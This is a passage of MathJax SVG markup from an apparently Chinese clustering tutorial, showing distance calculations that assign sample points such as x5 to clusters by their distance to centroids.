transform="translate(605,-150) scale(0.707)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g></g></g></g></svg></mjx-container>分到类<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="4.011ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 1772.7 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g></g></g></svg></mjx-container>。</p><p>对<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="46.888ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 20724.6 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="mo" transform="translate(1286.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2342.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(2731.1,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g><g data-mml-node="mo" transform="translate(3231.1,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(3675.8,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="msup" transform="translate(4175.8,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="TeXAtom" transform="translate(422,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="54" d="M36 443Q37 448 46 558T55 671V677H666V671Q667 666 676 556T685 443V437H645V443Q645 445 642 478T631 544T610 593Q593 614 555 625Q534 630 478 630H451H443Q417 630 414 618Q413 616 413 339V63Q420 53 439 50T528 46H558V0H545L361 3Q186 1 177 0H164V46H194Q264 46 283 49T309 63V339V550Q309 620 304 625T271 630H244H224Q154 630 119 601Q101 585 93 554T81 486T76 443V437H36V443Z"></path></g></g></g><g data-mml-node="mo" transform="translate(5158.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(5603,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(6123,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(6512,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="mo" transform="translate(7520.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(7965.2,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g><g data-mml-node="mo" transform="translate(9829.9,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(10496.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(11552.4,0)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(778,0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(1278,0)"></path></g><g data-mml-node="mo" transform="translate(13330.4,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(13775.1,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mo" transform="translate(14295.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msub" transform="translate(14684.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="mo" transform="translate(15692.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msubsup" transform="translate(16137.3,0)"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="TeXAtom" transform="translate(911,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(911,-297.3) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(18002,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(18668.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(19724.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g></svg></mjx-container>，将<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.282ex" height="1.375ex" role="img" focusable="false" viewBox="0 -442 1008.6 607.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g></g></g></svg></mjx-container>分到类<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.673ex" xmlns="http://www.w3.org/2000/svg" width="4.011ex" height="3.072ex" role="img" focusable="false" viewBox="0 -1060.7 1772.7 1358"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msubsup"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="TeXAtom" transform="translate(819,530.4) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g><g data-mml-node="mn" transform="translate(819,-297.3) 